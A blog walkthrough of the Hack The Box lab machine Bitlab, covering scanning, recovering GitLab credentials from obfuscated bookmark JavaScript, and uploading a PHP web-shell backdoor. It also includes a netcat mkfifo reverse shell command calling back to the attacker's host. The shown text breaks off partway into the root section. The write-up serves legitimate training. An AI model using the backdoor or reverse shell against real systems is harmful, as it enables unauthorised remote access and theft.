<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Bitlab - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Bitlab from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Bitlab">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/bitlab/">


  <meta property="og:description" content="My write-up / walkthrough for Bitlab from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Bitlab">
  <meta name="twitter:description" content="My write-up / walkthrough for Bitlab from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/bitlab/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2020-01-11T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/bitlab/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Bitlab">
    <meta itemprop="description" content="Hack The Box - Bitlab">
    <meta itemprop="datePublished" content="2020-01-11T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/bitlab/" class="u-url" itemprop="url">Hack The Box - Bitlab
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2020-01-11T07:00:00+02:00">January 11, 2020</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          8 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---bitlab">Hack The Box - Bitlab</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#web-enumeration">Web Enumeration</a></li>
<li><a href="#file-upload--rce--shell-as-www-data">File Upload –&gt; RCE –&gt; Shell as www-data</a></li>
<li><a href="#database-access--claves-password--ssh-as-clave--user-flag">Database Access –&gt; Clave’s Password –&gt; SSH as Clave –&gt; User Flag</a></li>
<li><a href="#reversing-remoteconnectionexe--roots-password--ssh-as-root---root-flag">Reversing RemoteConnection.exe –&gt; Root’s Password –&gt; SSH as Root –&gt;  Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---bitlab">Hack The Box - Bitlab</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Bitlab retired and here’s my write-up about it. It was a nice CTF-style machine that mainly had a direct file upload and a simple reverse engineering challenge. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.114</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">bitlab.htb</code>. Let’s jump right in !</p>

<p><br><img src="/images/hackthebox/bitlab/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/bitlab# nmap -sV -sT -sC -o nmapinitial bitlab.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 13:44 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.14s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.56 seconds
root@kali:~/Desktop/HTB/boxes/bitlab# 
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">http</code> on port 80 and <code class="language-plaintext highlighter-rouge">ssh</code> on port 22, <code class="language-plaintext highlighter-rouge">robots.txt</code> existed on the web server and it had a lot of entries.<br></p>

<h2 id="web-enumeration">Web Enumeration</h2>
<p><code class="language-plaintext highlighter-rouge">Gitlab</code> was running on the web server and we need credentials:
<br><img src="/images/hackthebox/bitlab/1.png" alt="" class="align-center"><br><br>
I checked <code class="language-plaintext highlighter-rouge">/robots.txt</code> to see if there was anything interesting:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/bitlab# curl http://bitlab.htb/robots.txt                                                                                                                                                             [18/43]
# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file                                                                                                                                          
#                                                                                                                                                                                                                                          
# To ban all spiders from the entire site uncomment the next two lines:                                                                                                                                                                    
# User-Agent: *                                                                                                                                                                                                                            
# Disallow: /                                                                                                                                                                                                                              
                                                                                                                                                                                                                                           
# Add a 1 second delay between successive requests to the same server, limits resources used by crawler                                                                                                                                    
# Only some crawlers respect this setting, e.g. Googlebot does not                                                                                                                                                                         
# Crawl-delay: 1                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application                                                        
User-Agent: *                                                                                                                                                                                                                              
Disallow: /autocomplete/users                                                                                                                                                                                                              
Disallow: /search                                                                                                                                                                                                                          
Disallow: /api                                                                                                                                                                                                                             
Disallow: /admin                                                                                                                                                                                                                           
Disallow: /profile                                                                                                                                                                                                                         
Disallow: /dashboard                                                                                                                                                                                                                       
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/
Disallow: /*/-/group_members
Disallow: /*/project_members
root@kali:~/Desktop/HTB/boxes/bitlab#
</code></pre></div></div>
<p>Most of the disallowed entries were paths related to the <code class="language-plaintext highlighter-rouge">Gitlab</code> application. I checked <code class="language-plaintext highlighter-rouge">/help</code> and found a page called <code class="language-plaintext highlighter-rouge">bookmarks.html</code>:
<br><img src="/images/hackthebox/bitlab/2.png" alt="" class="align-center"><br><br>
There was an interesting link called <code class="language-plaintext highlighter-rouge">Gitlab Login</code>:
<br><img src="/images/hackthebox/bitlab/3.png" alt="" class="align-center"><br><br>
Clicking on that link didn’t result in anything, so I checked the source of the page, the <code class="language-plaintext highlighter-rouge">href</code> attribute had some <code class="language-plaintext highlighter-rouge">javascript</code> code:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"javascript:(function(){ var _0x4b18=[&amp;quot;\x76\x61\x6C\x75\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;quot;,&amp;quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;quot;,&amp;quot;\x63\x6C\x61\x76\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;quot;,&amp;quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()"</span> <span class="na">ADD_DATE=</span><span class="s">"1554932142"</span><span class="nt">&gt;</span>Gitlab Login<span class="nt">&lt;/A&gt;</span>
</code></pre></div></div>
<p>I took that code, edited it a little bit and used the <code class="language-plaintext highlighter-rouge">js</code> console to execute it:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">~</span><span class="sr">/Desktop/</span><span class="nx">HTB</span><span class="o">/</span><span class="nx">boxes</span><span class="o">/</span><span class="nx">bitlab</span><span class="err">#</span> <span class="nx">js</span>
<span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">_0x4b18</span><span class="o">=</span><span class="p">[</span><span class="dl">'</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x6C</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x65</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x5F</span><span class="se">\</span><span class="s1">x6C</span><span class="se">\</span><span class="s1">x6F</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6E</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x6C</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x6D</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x6E</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x49</span><span class="se">\</span><span class="s1">x64</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x6C</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x65</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x5F</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x6F</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x64</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x64</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x30</span><span class="se">\</span><span class="s1">x30</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x78</span><span class="dl">'</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
<span class="nl">Thrown</span><span class="p">:</span>
<span class="nl">ReferenceError</span><span class="p">:</span> <span class="nb">document</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">defined</span>
<span class="o">&gt;</span>
</code></pre></div></div>
<p>Then I printed the variable <code class="language-plaintext highlighter-rouge">_0x4b18</code> which had the credentials for <code class="language-plaintext highlighter-rouge">Gitlab</code>:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nx">_0x4b18</span>
<span class="p">[</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">user_login</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">clave</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">user_password</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">11des0081x</span><span class="dl">'</span> <span class="p">]</span>
<span class="o">&gt;</span> 
</code></pre></div></div>

<h2 id="file-upload--rce--shell-as-www-data">File Upload –&gt; RCE –&gt; Shell as www-data</h2>
<p>After logging in with the credentials (<code class="language-plaintext highlighter-rouge">clave : 11des0081x</code>) I found two repositories, <code class="language-plaintext highlighter-rouge">Profile</code> and <code class="language-plaintext highlighter-rouge">Deployer</code>:
<br><img src="/images/hackthebox/bitlab/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/5.png" alt="" class="align-center"><br><br>
I also checked the <code class="language-plaintext highlighter-rouge">snippets</code> and I found an interesting code snippet that had the database credentials which will be useful later:
<br><img src="/images/hackthebox/bitlab/6.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/7.png" alt="" class="align-center"><br><br></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=localhost dbname=profiles user=profiles password=profiles"</span><span class="p">);</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">"SELECT * FROM profiles"</span><span class="p">);</span>
</code></pre></div></div>
<p>Back to the repositories, I checked <code class="language-plaintext highlighter-rouge">Profile</code> and it was pretty empty:
<br><img src="/images/hackthebox/bitlab/8.png" alt="" class="align-center"><br><br>
The path <code class="language-plaintext highlighter-rouge">/profile</code> was one of the disallowed entries in <code class="language-plaintext highlighter-rouge">/robots.txt</code>, I wanted to check if that path was related to the repository, so I checked if the same image (<code class="language-plaintext highlighter-rouge">developer.jpg</code>) existed, and it did:
<br><img src="/images/hackthebox/bitlab/9.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/10.png" alt="" class="align-center"><br><br>
Now we can simply upload a <code class="language-plaintext highlighter-rouge">php</code> shell and access it through <code class="language-plaintext highlighter-rouge">/profile</code>, I uploaded the <code class="language-plaintext highlighter-rouge">php-simple-backdoor</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>

<span class="cp">&lt;?php</span>

<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">;</span>
        <span class="nv">$cmd</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
        <span class="k">die</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<span class="c">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
</code></pre></div></div>

<p><br><img src="/images/hackthebox/bitlab/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/12.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/14.png" alt="" class="align-center"><br><br>
Then I merged it to the <code class="language-plaintext highlighter-rouge">master</code> branch:
<br><img src="/images/hackthebox/bitlab/15.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/16.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/17.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bitlab/18.png" alt="" class="align-center"><br><br>
I used the <a href="rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff"><code class="language-plaintext highlighter-rouge">netcat openbsd</code> reverse shell payload</a> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">PayloadsAllTheThings</code></a> to get a shell, had to <code class="language-plaintext highlighter-rouge">urlencode</code> it first:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/bitlab# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.114] 44340
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@bitlab:/var/www/html/profile$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/bitlab# stty raw -echo
root@kali:~/Desktop/HTB/boxes/bitlab# nc -lvnp 1337

www-data@bitlab:/var/www/html/profile$ export TERM=screen
www-data@bitlab:/var/www/html/profile$ 
</code></pre></div></div>

<h2 id="database-access--claves-password--ssh-as-clave--user-flag">Database Access –&gt; Clave’s Password –&gt; SSH as Clave –&gt; User Flag</h2>
<p>After getting a shell as <code class="language-plaintext highlighter-rouge">www-data</code> I wanted to use the credentials I got earlier from the code snippet and see what was in the database, however <code class="language-plaintext highlighter-rouge">psql</code> wasn’t installed:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bitlab:/var/www/html/profile$ psql
bash: psql: command not found
www-data@bitlab:/var/www/html/profile$ 
</code></pre></div></div>
<p>So I had to do it with <code class="language-plaintext highlighter-rouge">php</code>:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">bitlab</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">profile</span><span class="err">$</span> <span class="n">php</span> <span class="o">-</span><span class="n">a</span>
<span class="nc">Interactive</span> <span class="n">mode</span> <span class="n">enabled</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="nv">$connection</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s1">'pgsql:host=localhost;dbname=profiles'</span><span class="p">,</span> <span class="s1">'profiles'</span><span class="p">,</span> <span class="s1">'profiles'</span><span class="p">);</span>
</code></pre></div></div>
<p>I executed the same query from the code snippet which queried everything from the table <code class="language-plaintext highlighter-rouge">profiles</code>, and I got clave’s password which I could use to get <code class="language-plaintext highlighter-rouge">ssh</code> access:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$connection</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT * FROM profiles"</span><span class="p">);</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="nv">$profiles</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetchAll</span><span class="p">();</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$profiles</span><span class="p">);</span>
<span class="k">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="k">Array</span>
        <span class="p">(</span>
            <span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span>
            <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1</span>
            <span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">clave</span>
            <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">clave</span>
            <span class="p">[</span><span class="n">password</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">c3NoLXN0cjBuZy1wQHNz</span><span class="o">==</span>
            <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="n">c3NoLXN0cjBuZy1wQHNz</span><span class="o">==</span>
        <span class="p">)</span>

<span class="p">)</span>
<span class="n">php</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<p><br><img src="/images/hackthebox/bitlab/19.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="reversing-remoteconnectionexe--roots-password--ssh-as-root---root-flag">Reversing RemoteConnection.exe –&gt; Root’s Password –&gt; SSH as Root –&gt;  Root Flag</h2>
<p>In the home directory of clave there was a Windows executable called <code class="language-plaintext highlighter-rouge">RemoteConnection.exe</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
